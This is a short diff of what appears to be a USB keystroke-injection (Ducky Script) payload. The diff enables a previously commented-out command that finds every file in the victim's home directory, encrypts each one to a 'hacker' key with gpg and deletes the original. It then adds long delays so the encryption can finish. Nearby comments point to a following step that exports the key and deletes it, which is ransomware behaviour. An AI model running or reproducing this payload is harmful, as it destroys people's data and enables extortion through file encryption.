@@ -83,9 +83,26 @@ REM === Encrypt everything in home directory.
 REM === Uses `find` command to list all files under home, then
 REM === feed that through xargs to bash and execute the local
 REM === gpg to encrypt it, then remove the original file.
-REM STRING find $HOME -type f -print0 | xargs -0 bash -c 'for filename; do ./gpg1 -ea -r hacker "$filename"; rm "$filename"; done' bash
-REM ENTER
-DELAY 2000
+STRING find $HOME -type f -print0 | xargs -0 bash -c 'for filename; do ./gpg1 -ea -r hacker "$filename"; rm "$filename"; done' bash
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
 
 REM =================================
 REM Step 3. Export key to USB & delete
